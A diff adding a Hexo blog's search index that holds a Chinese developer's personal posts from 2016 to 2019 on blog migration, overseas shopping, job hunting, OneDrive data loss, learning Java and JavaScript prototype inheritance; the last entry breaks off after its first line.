@@ -1,0 +1,957 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Back</title>
+    <url>/2019/01/03/life/Back/</url>
+    <content><![CDATA[<h1 id="呼呼"><a href="#呼呼" class="headerlink" title="呼呼"></a>呼呼</h1><p>规整了一下 Github~ 想起还有个博客 N 久没打理了。去北京后是真没时间。一晃过去就 3 年了。以前还挺喜欢写写画画的，毕业后也没了闲心。读书那会不想看书就不看，恶心的题目不做还有的抄。上班以后……你就是知道是屎还得吃，还得逼自己吃。即是生活。</p>
+<h1 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h1><p>还是基于 Hexo，还是 NexT。跨了几个大版本，索性从头开始。看到 Github 上的讨论，NexT 原作者估计是忙，被个老外接收了，还出来质疑为啥原作者不理他了。好在 Api 没有大的变动。除了 <code>lang</code> 从 <code>zh-Hans</code> 变为了 <code>zh-CN</code> 这个小坑，基本平滑过渡。文章支持了 <code>UpdateDate</code>，写了个 Node 本想批量更新到所有文章的 <code>Front-matter</code> 里面去，结果弄错对象了，更新时间覆盖掉了创建时间~~ 算了。</p>
+<h1 id="明年学啥"><a href="#明年学啥" class="headerlink" title="明年学啥"></a>明年学啥</h1><p>前端的轮子滚滚向前，相比起来，后端的 Node 倒是能平心静气。即便有了<code>Koa</code>, <code>Express</code> 还是能活的好好地。前端明年 Vue3 要来了，用 Ts 重写。感觉 JS | Ts 早晚一天会在一起，相比起来后端确实 Ts 更好用，因为我也在动态类型这个坑里面掉过：某个投票 <code>+1</code>，结果票数变成了 <code>11111111111111</code> T.T</p>
+<p>如果继续前端的话，那就剩 React 了，唯一的诱惑就是 ReactNative , Weex 是肯定要坑了。那么问题来了，RN 的意义。无非是网页套壳的 App（容器里的 Js 可能更贴切），一次开发天下我有，看起来很美。但是既然都有 Web 了，为什么还要装 App 呢？为了有 App 而 App 吗？我认为以后的 App 只会剩下功能性（复制短信二维码、QQ 微信社交等）和效能型（视频编辑转码等高性能），而信息类终归是 Web 的主战场。当然这是理想中的结局。Web 天生被浏览器禁锢，各大厂商无非是想用 App 来获得更多用户信息罢了。但是这对我有什么好处呢？除了简历以外，并没有什么实质性的提升。我感觉还是绑在轮上一圈又一圈，终到头，不过是在一个新的容器写前端罢了。</p>
+<p>我更想了解一门新的语言，Golang 或者 Kotlin&#x2F;Java。</p>
+<p>Golang 几个月前尝试了解了一下。感觉还是初生儿，包管理都没统一。看过一个笑话, <em>Golang 没有一个像样的包管理器，Node 也没有一个像样的管理器。</em> 后半句算是调侃，前半句是真的难受。然后 Golang 一个项目就需要一个环境变量，Atom 的插件也是寥寥，Mac&#x2F;linux 工具偏多， Windows 各种问题~ #￥#%&amp;%……_……（_）我还是缓缓吧~</p>
+<p>Kotlin&#x2F;Java 更多是因为平时使用手机总会略感遗憾，搜了下 Play 商店又没人做，自己写 App 总是可以随心所欲的，能解决不少平时遇到的问题。Web 权限有限，App 能实现更多。IOT 也越来越有趣了，我觉得我终会入这个坑的吧，除了对 Java 有点恶心以外。</p>
+<h1 id="迁移"><a href="#迁移" class="headerlink" title="迁移"></a>迁移</h1><p>还没说为啥要规整 Github~ Vps 是封了一轮又一轮，猫捉老鼠是真的累了。。封了以后的那几天和妹纸分手一样的感觉，空旷得可以。看到 <code>Coding.net</code> 抱上了腾讯的大腿，而且代码托管可以私密，以及免备案 HK-CN2 无限量的 Pages 服务。OK~ 搬家！ Vps 也准备区分开，专注跑服务，另外再买个专用 FQ，不至于封了以后全部服务，数据库要重新配~ 那个蛋疼…… 多说一句，当时我真是震惊了还有这样的操作，HK 的网络便宜到个人都可以在家 VMware 机房，G 口，动态 IP，可以 Netflix，而且每天一个 IP 妈妈再也不担心我被 Q 了。</p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>那啥，其实写这篇我就是测试下新部署的播客能不能用，对吧。当然，还要测试下图片。</p>
+<p><img src="/2019/01/03/life/Back/dog.bmp" alt="dog"></p>
+<p>Hello Word Again!</p>
+]]></content>
+      <categories>
+        <category>life</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Back2</title>
+    <url>/2019/01/04/life/Back2/</url>
+    <content><![CDATA[<p>… 估计是 Coding.net 和 腾讯还没合并好，各种 bug，SSH-key 推的服务器 <code><a href="mailto:&#103;&#x69;&#116;&#x40;&#x67;&#x69;&#x74;&#x2e;&#x63;&#x6f;&#100;&#105;&#110;&#x67;&#46;&#110;&#x65;&#x74;">&#103;&#x69;&#116;&#x40;&#x67;&#x69;&#x74;&#x2e;&#x63;&#x6f;&#100;&#105;&#110;&#x67;&#46;&#110;&#x65;&#x74;</a></code> <code><a href="mailto:&#103;&#105;&#116;&#x40;&#103;&#x69;&#116;&#x2e;&#100;&#x65;&#x76;&#46;&#116;&#x65;&#x6e;&#x63;&#x65;&#x6e;&#x74;&#46;&#99;&#x6f;&#109;">&#103;&#105;&#116;&#x40;&#103;&#x69;&#116;&#x2e;&#100;&#x65;&#x76;&#46;&#116;&#x65;&#x6e;&#x63;&#x65;&#x6e;&#x74;&#46;&#99;&#x6f;&#109;</a></code> 傻傻分不清楚，搞了一下午。主要是腾讯的文档里面全是 Coding.net，这就很蛋疼了。而且说迁移到腾讯可以无限空间，可是我发布 Pages 服务一直 404，反反复复搞了好久，最后发现还是和 Coding.net 一样，超过 100M 不可用。。。 最重要的是相关文档迁移到腾讯以后容量这部分说明已经删掉了。蛋碎……</p>
+<p>还是回到 Github 算了，虽然不FQ速度真是慢~ 然后把 Github 的 Commit 恢复到第一版了，因为这几年的 Commit 里面有不少隐私信息，几百条 Commit 又不好找。干脆一了百了~ 有一次直接有人打电话给我说外包的事情真是吓到我了，我都忘了什么时候把自己电话 Push 上去了。。。 Coding 可以免费隐私项目，也是迁移的主要原因吧。 Github 上就一些个人项目 也没必要为了博客付费了（付费我还不如直接搭在 Vps 上……）。</p>
+<p>Coding.net 还是等等看吧~</p>
+]]></content>
+      <categories>
+        <category>life</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>HoHo无税到手</title>
+    <url>/2016/05/24/life/HoHo%E6%97%A0%E7%A8%8E%E5%88%B0%E6%89%8B/</url>
+    <content><![CDATA[<p><em>Updata 206.05.28</em></p>
+<p>无税到手，海关都没进，这次海运总计20天不到，又破纪录了。<br>想怕是都不敢买才有如此神速的吧。<br>Lucky~</p>
+<span id="more"></span>
+
+<p>今年1月淘了 Vali 后就停手了，之后过年、离职折腾到3月，碰上4.8新政……我自己解读后倒没觉得咋样，只是取消50免征，对我而言仅是小样没法走主动报关通道避税，其他还是纯 RP 。但网上已是满城风雨，各大媒体高呼“赶尽杀绝”，好像只要是 GVMT 发的文总想搞个大新闻。ㄟ (▔, ▔) ㄏ</p>
+<p>虽然问题不大，但之前 iPhone 6 的顶风作案来看，刚打完鸡血的海关还是挺有战斗力的， So 还是纠结着观望一月。那次着实是少赚不少～ ╮（╯＿╰）╭</p>
+<p>4月底的少量试探后都轻松过关，这次趁着买尿布继续重操旧业。日本-海运-走起! 味觉糖你该想我了～   (*<del>▽</del>)y<br><img src="/2016/05/24/life/HoHo%E6%97%A0%E7%A8%8E%E5%88%B0%E6%89%8B/HoHo%E6%B5%B7%E6%B7%98%E9%A1%B6%E9%A3%8E%E4%BD%9C%E6%A1%88%E5%88%B0%E6%89%8B-candy.jpg" alt="Alt text"></p>
+<p>只是周围都深受媒体毒害不敢参与….这波集火才 14+kg ，历史新低～不过速度倒是出乎意料，今天刷了下物流才15天就到国内了，估摸着5.30进海关，31就能到手了。<br><img src="/2016/05/24/life/HoHo%E6%97%A0%E7%A8%8E%E5%88%B0%E6%89%8B/HoHo%E6%B5%B7%E6%B7%98%E9%A1%B6%E9%A3%8E%E4%BD%9C%E6%A1%88%E5%88%B0%E6%89%8B-%E6%B5%B7%E6%B7%98.jpg" alt="Alt text"><br>粗略算算，海淘买过的东西少说都有150+Kg了。每月都和20Kg+的大包裹谈笑风生。除了顶风作案 iPhone 6 那会去海关见了下世面，还没被税过。我相信4.8后的海关肯定还是那么和蔼可亲滴～<br> &lt;(￣ˇ￣)&#x2F; </p>
+<p><img src="/2016/05/24/life/HoHo%E6%97%A0%E7%A8%8E%E5%88%B0%E6%89%8B/HoHo%E6%B5%B7%E6%B7%98%E9%A1%B6%E9%A3%8E%E4%BD%9C%E6%A1%88%E5%88%B0%E6%89%8B-%E6%B5%B7%E6%B7%98-vali.jpg" alt="萌萌哒 "></p>
+]]></content>
+      <categories>
+        <category>life</category>
+      </categories>
+      <tags>
+        <tag>海淘</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Restart</title>
+    <url>/2016/07/29/life/Restart/</url>
+    <content><![CDATA[<p>发了简历后就忙成狗，明天去帝都就要从 0 开始了，没有笔记本估计很长一段时间不会更新了。</p>
+<p>帝都找房实在是太费神，劣币驱逐良币。资源全在中介手上，新起的平台想实现公平没资源，然后这么恶性循环着。具体就不细说了…… 还是多拿点工资最靠谱。</p>
+<p>最近写的也少了，不知道会不会手生。只写了些CSS视觉效果上的布局，吐槽下 angularJs 入门真是太难了，也找不到比较好的教材，买的 “福氏角箱鲀” 里面很多也是过时的，而且非常生硬……</p>
+<p>好烦啊！！！</p>
+]]></content>
+      <categories>
+        <category>life</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Say Hi</title>
+    <url>/2016/05/20/life/Say-Hi/</url>
+    <content><![CDATA[<p>　　好久没写东西了，太平淡的生活憋不出故事。每天就是看书睡觉，挺简单的，不知还能扛多久～</p>
+<p>　　工欲善其事, 必先利其器。之前不管是VPS还是LOFTER总感不顺手。VPS是一家HK小服务商，没有后台全盘备份。linux不精，不敢瞎折腾,不然家里外网就挂了:&lt;　网易的LOFTER整天推广告&#x2F;人体艺术，不务正业。现在搭在Github上总算是不用操心后端的事了，虽然Github很慢，被墙对我影响不大，却刚好符合我的想法，我只想安安静静写点东西罢了，搜索引擎的爬虫也禁了吧。</p>
+<span id="more"></span>
+
+<p>　　近三个月先把在职时零星看的书重刷了一遍，前端还是上手挺快的。没有像当初C那样，倒腾了那么久还只能CMD中加减乘除，现在是实实在在能依着想法出东西了。只是前端和本地隔着太远，还不知道怎样能利用JS像.bat那样方便生活。后端的距离也是高深莫测了。 ╮(╯_╰)╭　　</p>
+<blockquote>
+<p>珍爱生命，多用python</p>
+</blockquote>
+<p>　　学的越多，越觉得坑越多。首先是IE的兼容，IE真特么是个巨坑，神马都要自己搞一套，我说微软你咋这么任性呢，搞得要多写这么多代码T.T 接着是多平台，虽然现在还没涉及，隐约觉得这才是最大的幕后boss。综上在我遇见JQuery后相见恨晚，满满的幸福感 <em>write less, do more</em>真是对这混乱前端的终极追求。</p>
+<p>　　虽然每天RSS刷的挺多，能写的东西真是太少了，勉强凑了小半页，再想个彩蛋弄弄这博客总算开张了。开头难呐！</p>
+<blockquote class="blockquote-center">Hello World!</blockquote>
+
+]]></content>
+      <categories>
+        <category>life</category>
+      </categories>
+      <tags>
+        <tag>随笔</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>我说你好好的脱欧干嘛</title>
+    <url>/2016/07/05/life/%E6%88%91%E8%AF%B4%E4%BD%A0%E5%A5%BD%E5%A5%BD%E7%9A%84%E8%84%B1%E6%AC%A7%E5%B9%B2%E5%98%9B/</url>
+    <content><![CDATA[<p>6 月初帮别人日本代购块表，忙起来就忘了。</p>
+<p>还款期快到，来了短信才想起来，看了下汇率…… <strong>^&amp;(_)&amp;(^&amp;%$^#$#</strong></p>
+<p><img src="/2016/07/05/life/%E6%88%91%E8%AF%B4%E4%BD%A0%E5%A5%BD%E5%A5%BD%E7%9A%84%E8%84%B1%E6%AC%A7%E5%B9%B2%E5%98%9B/ry1.jpg" alt="日元"></p>
+<span id="more"></span>
+
+<p>特么一共才象征性的收了 50 的代购费，特么现在一下子就亏了总价的 10% …… 不仅没赚还要倒贴， 我累个大草……</p>
+<p>6 月初那波小幅回升其实还在预料之中，6.24 一天 7% 就是纯背锅了，虽然之前脱欧的消息满天飞，但也没在意，这下就被坑出翔来了。脱欧英镑顺势暴跌，资本大量涌入日元，一天能波动 10% 我也是醉了。 日淘又一个冬天来临，比起去年这时候已经是跌 25% 了。</p>
+<hr/>
+
+<p>英镑 ▼<br><img src="/2016/07/05/life/%E6%88%91%E8%AF%B4%E4%BD%A0%E5%A5%BD%E5%A5%BD%E7%9A%84%E8%84%B1%E6%AC%A7%E5%B9%B2%E5%98%9B/yb.jpg" alt="yb.jpg"></p>
+<p>日元 ▼</p>
+<p><img src="/2016/07/05/life/%E6%88%91%E8%AF%B4%E4%BD%A0%E5%A5%BD%E5%A5%BD%E7%9A%84%E8%84%B1%E6%AC%A7%E5%B9%B2%E5%98%9B/ry2.jpg" alt="ry2.jpg"></p>
+<hr/>
+
+<p>还好上月那一大批算是高位还的，两个月算下来还有得小赚。不过之后日本估计是没法继续淘了，Apple 为例：之前便宜大概 25%，现在算下来和国内均价 。虽然现在英国全场 8.7 折，可不列颠的东西本身就贵啊 T.T ，而且英国的运费也是天坑，首重 200+ 续重 10+ 这定价，不知道怎么想出来的……</p>
+<p>美帝独立日又到了，按说又是一波剁手的好时机。可眼前干粮都不足，远方还是缓缓吧～ 速速找个工作存一波 争取黑五添个 Xps 15‘ 嘎嘎～</p>
+<p><img src="/2016/07/05/life/%E6%88%91%E8%AF%B4%E4%BD%A0%E5%A5%BD%E5%A5%BD%E7%9A%84%E8%84%B1%E6%AC%A7%E5%B9%B2%E5%98%9B/biao.jpg" alt="biao.jpg"></p>
+]]></content>
+      <categories>
+        <category>life</category>
+      </categories>
+      <tags>
+        <tag>海淘</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>最近</title>
+    <url>/2016/06/17/life/%E6%9C%80%E8%BF%91/</url>
+    <content><![CDATA[<p>HTML &#x2F; CSS &#x2F; JS-JQ 学得差不多了，至少现在几大网站的首页是能仿下来。然后花了一天时间看了以后的路就蒙逼了。各种框架层出不穷，前端的速度真是太快，本还想停下歇息几天，现在感觉停下意味着死亡。只觉得时间不够，太多坑要填。这么多框架选哪个？</p>
+<p><img src="/2016/06/17/life/%E6%9C%80%E8%BF%91/kj.png" alt="框架"></p>
+<span id="more"></span>
+
+<p>之前一直以为自己的精力是无限的，只要感觉来了就可以一直折腾下去，目前看来专精某一种才是王道。试着学了下 React，虚拟 Dom 好难受。最大的问题是如果以后的生产环境不是 React，怎么办？而且前端如此高速的迭代，怎么才能追上？ 只有拿命拼了……</p>
+<p>沉下心来，与其盲目的选择，不如在原地先看看。我觉得还是应该先去把犀牛书再翻翻，这么多框架 JS 万变不离其中。好像也是没有办法的办法了～ 我要开始找工作了啊！却还只能原地踏步。 好纠结……</p>
+<hr/>
+
+<p>之前去看了魔兽首映，（一直很好奇 Warcraft 是怎么就翻译成魔兽了呢) 游戏改编一直觉得是坑，毕竟是商业行为，那是要赚钱的。就要照顾到没玩过的朋友们，原著的改编不可避免。玩家又是忠于原著的。两者调和下的四不像觉得两边都得罪了。这次符合暴雪个性一如既往的很多彩蛋，开场 Logo 就有守望的大屁股…… 以及我看过数量最多的开场片头 &#x3D;。&#x3D;～ 整体看下来一般吧，原著改了很多，故事很精简。最重要的是开场前先去 MC 继续刷风剑的半脑，上线竟然卡勒！看来挺多人来还愿的。怨念的是继续没掉，不知道剩余十来天的点卡够不够我刷出风剑……魔兽已经成了记忆的传承，超越的游戏本身。虽然资料片不断的续命，可玩家依然怀念的是那个 60 年代的故事，主要的还是 60 年代后面的回忆吧。唉 其他事不想说了 都是回忆。</p>
+<p>放一只我们家的霜狼～ 萌萌哒 (,,• ₃ •,,</p>
+<p><img src="/2016/06/17/life/%E6%9C%80%E8%BF%91/guoguo.PNG" alt="guoguo.PNG"></p>
+]]></content>
+      <categories>
+        <category>life</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>朋友圈的无奈</title>
+    <url>/2016/07/21/life/%E6%9C%8B%E5%8F%8B%E5%9C%88%E7%9A%84%E6%97%A0%E5%A5%88/</url>
+    <content><![CDATA[<p>网络让人们获取信息的方式更加快捷，廉价。不知从什么时候开始，<em>鸡汤文&#x2F;成功学</em> 就开始充斥网络，这种急功近利的文章各种转发不厌其烦。特别是父一辈，网络上单纯的像个孩子，听之任之完全没有防备。</p>
+<p><em>今天又有转发…… 还是我妈 好无奈</em></p>
+<blockquote>
+<p><a href="http://mp.weixin.qq.com/s?__biz=MjM5MDQzOTIwMw==&mid=2650145108&idx=2&sn=fc8c414b197795319b97d7f9962e4bc3&scene=1&srcid=0627uAYVHgKvhsOYMggS55I1&from=singlemessage&isappinstalled=0#wechat_redirect">wechat-陈安之</a></p>
+</blockquote>
+<span id="more"></span>
+
+<hr>
+1. 小王一出，基本上都会被大王拍死。说明老大在，老二最好不要发话!
+*那别人的牌比你大 你就不用出牌了咯？*
+
+<ol start="2">
+<li><p>没有一张大牌开路，再顺的小牌都出不去。说明领导很重要！<br><em>起手就是 3～10 的连对为什么不能赢？</em></p>
+</li>
+<li><p>无论你多会记牌、打牌，都抵不过人家手中的一把好牌。说明实力比能力重要！<br><em>打牌从来不是一把定输赢，如果不会记牌，打牌。至少这局会输的很惨。而一盘至少我能少输</em></p>
+</li>
+<li><p>如果一堆小牌连不起来，即使拿个双王也未必会赢。说明再牛的领导也需一个好团队！<br><em>废话，难道有人能兼职从领导到团队然后一个人的公司能做好？</em></p>
+</li>
+</ol>
+<p>人生是打牌不咯， 会打牌能醒人生不咯。<br>如果他说的对，成功了。为什么还在这发鸡汤，这鸡汤文除了能看起来好有道理，细想不就是一堆废话。<br>各种鸡汤 成功学如果有用，看一本马云语录就能复制一个马云，这世界还有穷人？<br>到头来顶多是 “<strong>道理我都懂，却依然过不好这一生</strong>。”</p>
+<p>附<br>你怎么看待陈安之及其他的成功学<br><a href="https://www.zhihu.com/question/20372055?rf=21248937">https://www.zhihu.com/question/20372055?rf=21248937</a></p>
+]]></content>
+      <categories>
+        <category>life</category>
+      </categories>
+      <tags>
+        <tag>wechat</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>祸不单行</title>
+    <url>/2016/07/08/life/%E7%A5%B8%E4%B8%8D%E5%8D%95%E8%A1%8C/</url>
+    <content><![CDATA[<p>这两天真是一堆坑……</p>
+<p>昨天去面试，早上6点多醒来赶车。虽然之前沟通过面试不需要写代码，冥冥中还是觉得有备无患。起来打包 Brackets 的配置文件，特么竟然有 500+MB …… 丢在 OneDrive 设个定时关机就走了。 走的瞬间好像喵到 OneDrive 文件夹结构不对，算了…… 先走。</p>
+<p>早上的公交也是少，等了十来分钟才来，还是满的。这时距离开车还有 30+ 分钟，平时过去也就15分钟车程，不急。坑爹的是这车竟然改道了！原来直线的路程现在绕二中一周，硬是墨迹半小时。庆幸检票刚好赶到，想着直接刷身份证上车也算有惊无险，然后就呵呵了。身份证无效！被告知新办的第三代身份证无法在轧机验证，还是要先取票……不管怎样，最后总算上了车，搜索后得知去年 7 月份就已经有案例，铁道部这效率～ 懒得吐槽。</p>
+<span id="more"></span>
+
+<p>面试没啥说的，被我猜对。上来就让写代码，暗喜还好有 Plan B，网络也还好，有全局的梯子。貌似都在意料之中且可控，结果…… 黑名单里 Amazon 的 S3 都没覆盖。 Brackets 在我走之前都没下完，自己的 VPS 出口线路在深圳好像也绕道了，非直连 HK ，质量不佳。其实下完了也没啥用，还有500+MB的配置文件呢～ 这速度…… 慌了 &#x3D;.&#x3D;！ 回答问题也因为沟通不畅，都是特简单基础的问题，硬生生被我越想越复杂，例如只让我写个构造函数，然后执行两次（传参不同）；被我理解为在构造函数的原型添加方法,执行子函数的同时通过原型链调用父函数上创建的方法，写着写着又觉得不对，这样毫无意义啊；又沟通，最后我在回程的公交上才明白问的什么意思……T.T 写的同时，未调教的 WIN8 MSDN，时不时还要处理输入法、键盘布局的添乱。 越来越不可控，脑子开始罢工了，没了平时的思如泉涌，后面都成了垃圾时间，平时十来分钟搞定的难度最后反而还没解完全，脑子一直是空的，不知道在想什么。最后我估计是没戏～教训主要还是沟通不畅吧，也没啥好解释的，我已经努力想在陌生环境中找一份熟悉让自己安心，可网络还是没得 U 盘可靠。</p>
+<p>回家就更坑了。睡一下午起来打开电脑，就发现 OneDrive 文件夹已被清空。虽然从 OneDrive 官网可以恢复，但是对比后尼玛这是至少 2 个星期之前的版本好嘛。其实之前也发生过一次，但仅是一个文件夹，而且恢复后没造成损失就没在意，这次就坑大发了。况且我的文件备份策略是仅保留 30 天内的修改，不含删除。想想这应该是一个逻辑上的 BUG ； 我每次都是待机，也就是说有可能 OneDrive 卡死情况下我待机了。保留了 OneDrive 的有问题的同步状态，待机这段时间内我在其他电脑修改后，下次启动就混乱了。</p>
+<blockquote>
+<p>假设电脑 A 上有 10 个文件，备份 1-5 的时候 OneDrive 挂了，此时如果我待机， A 上的 OneDrive 会保留 “已同步1-5，6-10未完成”的状态。此时如果云端文件被修改（共享B修改），下次 A 开机后 OneDrive 会继续执行未完的任务而不验证这个任务是否已失效；A 上的 OneDrive 继续同步 6-10 ；可云端已经被修改源文件不存在， OneDrive 直接就把本地文件删了。接着继续同步下一轮，由于本地文件已被删除， OneDrive 则会继续把云端也删除…… 这样云端和本地就都被清空了。<br>而 OneDrive 卡住又是常有的事……（非网络问题）</p>
+</blockquote>
+<p>不过还好找到了一份 6.30 号的备份，恢复了上去。 OneDrive 解决了。当然事情不会这么简单，紧接着发现 Github 文件夹也挂了……仅剩几个空文件夹显示修改时间昨天早上～ 尼玛什么诡异的事情都被我碰上，昨天早上到底发生了什么？我一点都想不起来了…… 还好 Github 上还有成品的代码，再手工逆向为源码，当然也就是 HTML 和 MD 语法的转换，只是这一段时间博客的 增删 肯定都没了，也是恢复到大概6.30左右的样子……</p>
+<p>彻底放弃 OneDrive ，将同步内容迁移到 Dropbox ；明天去图书馆试试一般网络下 Dropbox 的可用性，如果不行明天搬 坚果云。</p>
+<p>这次看来单纯的备份工具也不行，只备份没有版本管理，如果文件丢失、损坏的错误情况一样会被“备份”，污染备份文件。目前看来 “Timemachine” 才是王道。 又得买硬盘了 T.T</p>
+]]></content>
+      <categories>
+        <category>life</category>
+      </categories>
+      <tags>
+        <tag>onedrive</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Android 开始咯</title>
+    <url>/2019/02/10/study/java/javaStudy/</url>
+    <content><![CDATA[<p>过几天就要上班了，瞎扯扯~</p>
+<p>年前纠结了下，最终还是任性了一把。没有选择 <code>Ts</code>&#x2F;<code>React</code>，虽然我知道深度比广度更利于生存，但是我相信广度的生活更好玩。So~ 2019 开始玩 <code>Android</code> 吧！<code>Go</code> 生态还是不太成熟，留到明年咯。</p>
+<p>说到 <code>Android</code>，不得不说就是 <code>Java</code> 还是 <code>Kotlin</code>。我本想弯道超车，直接从 <code>Kotlin</code> 上手，看了一个星期感觉不太对。首先 <code>Android</code> 领域目前来说，<code>Java</code> 还是绝对主力，目前网上搜索到的 <code>Android</code> 信息大部分是 <code>Java</code> 写的。其次，目前我认为 <code>Kotlin</code> 是包裹厚厚一层语法糖 <code>Java</code> 超集。如果从 <code>Kotlin</code> 开始有点下盘不稳的感觉~ 遂还是从头再来吧，开始了 <code>Java</code>。</p>
+<p>小半个月时间基本把 <code>Java</code> 语法过了一遍。和之前印象差不多，语法真有点太啰嗦了。当然我觉得相当一部分是因为成熟的工程化吧。我只想拿一个 <code>Object</code> 就得<code>OOP</code>，各种属性 <code>Get</code>、<code>Set</code> 一通代码就写满一页了。没有 <code>Js</code> 那么飘逸~ 强类型写起来麻烦不过 IDE 聪明了许多，比起 <code>ESlint</code> + <code>JS</code> 强多了。<code>idea</code> 和 <code>Atom</code> 之间快捷键基本没几个一样的，调了几天才不那么变扭。还有一堆常用插件 idea 上没找到类似的，写起来总归有点闹心。例如 <code>IDEA</code> 就没有自动添加末尾 <code>;</code> 的插件？</p>
+<p>哎~ 年后继续在舒适区还是出去 也是个麻烦事。其他因素太多了，要是这个世界只有纯粹的 1 0，会不会单纯很多呢~</p>
+<p>That all.</p>
+]]></content>
+      <categories>
+        <category>study</category>
+        <category>java</category>
+      </categories>
+      <tags>
+        <tag>java Android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JS原型链的继承</title>
+    <url>/2016/06/23/study/js/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF/</url>
+    <content><![CDATA[<p>在面向对象编程 JS 的原型链继承 这里卡几天了，觉得还是有必要把这个坑记下来。</p>
+<h4 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h4><p>先从简单的例子来。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">y</span> = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">a.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">x</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="title function_">a</span>();</span><br><span class="line"></span><br><span class="line">b.<span class="property">y</span>; <span class="comment">//2</span></span><br><span class="line">b.<span class="property">x</span>; <span class="comment">//1</span></span><br></pre></td></tr></table></figure>
+
+<p>每个函数对象都有一个 <em>prototype</em> ，通过 <em>new</em> 创建的实例的原型会指向函数的 <em>prototype</em> ，也就是继承函数 <em>prototype</em> 的属性。其中 x 属性是 b 原型上继承的， y 属性是 b 上面的，具象化脑图为。 每个函数对象都有一个 <em>prototype</em> ，通过 <em>new</em> 创建的实例的原型会指向函数的 <em>prototype</em> ，也就是继承函数 <em>prototype</em> 的属性。其中 x 属性是 b 原型上继承的， y 属性是 b 上面的，具象化脑图为。▼</p>
+<span id="more"></span>
+
+<p><img src="/2016/06/23/study/js/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF/nt1.jpg" alt="js1.jpg"></p>
+<p>b 可以查找到自身属性 y &#x3D; 1；还可以通过原型链继承 a 函数 <em>prototype</em> 上的 x &#x3D; 1; 以及 Obj 上的 <em>toString</em> 、 <em>valueOf</em> 等方法。 即原型链的继承。<br>**P.S _ _proto _ 仅为抽象属性(chrome)，用于上一层 <em>prototype</em> 的指针, 其他浏览器可以使用 obj.getPrototypeOf(obj) **</p>
+<hr/>
+
+<h4 id="原型链的嵌套"><a href="#原型链的嵌套" class="headerlink" title="原型链的嵌套"></a>原型链的嵌套</h4><p>再把问题升级一下。▼</p>
+<p><img src="/2016/06/23/study/js/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF/js2.jpg" alt="js2.jpg"></p>
+<p>这几天主要是卡在红框处，先来看红框之前的代码。▼</p>
+<p><img src="/2016/06/23/study/js/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF/nt2.jpg" alt="nt2.jpg"></p>
+<p>之前一直在想为什么不能写成 <strong>student.prototype &#x3D; person.prototype;</strong> 想了两天才记起来 <em>prototype</em> 是对象，对象的赋值是指针，如果直接赋值 <em>person</em> 的 <em>prototype</em> ，将导致两者 “共用” 一个 _prototype_，除了继承 <em>person.prototype</em> 的属性以外（红框处的 LEGS_NUM 等），还会为 <em>student.prototype</em> 添加独有属性时 “污染” 到 <em>person.prototype</em> 。▼</p>
+<p><img src="/2016/06/23/study/js/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF/nt3.jpg" alt="nt3.jpg"></p>
+<p>因此，应该使用 ** student.prototype &#x3D; Object.create(person.prototype);** ，创立一个继承 <em>person</em> 的空对象，然后将空对象的 <em>prototype</em> 赋值给 <em>student.prototype</em> ， 从而达到 <em>student.prototype</em> 继承 <em>person.prototype</em> 的目的。▼<br><img src="/2016/06/23/study/js/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF/nt4.jpg" alt="nt4.jpg"></p>
+<p>说直白一点，这几天就一直坑在这里</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123; <span class="attr">x</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> b = a;</span><br><span class="line">b.<span class="property">c</span> = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(a.<span class="property">c</span>); <span class="comment">//123;</span></span><br></pre></td></tr></table></figure>
+
+<p>T.T 这么简单的事想几天…… 要死要死要死</p>
+<hr/>
+
+<p>画脑图的时候翻到之前离职时候的交接，这特么叫没做事！！！</p>
+<p><strong>去!年!买!的!表!</strong></p>
+<p><img src="/2016/06/23/study/js/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF/ntty.png" alt="ntty.png"></p>
+]]></content>
+      <categories>
+        <category>study</category>
+        <category>js</category>
+      </categories>
+      <tags>
+        <tag>js</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>蛋疼的 dropbear 自动登录</title>
+    <url>/2019/01/11/study/openwrt/authorized-keys/</url>
+    <content><![CDATA[<p>say hi</p>
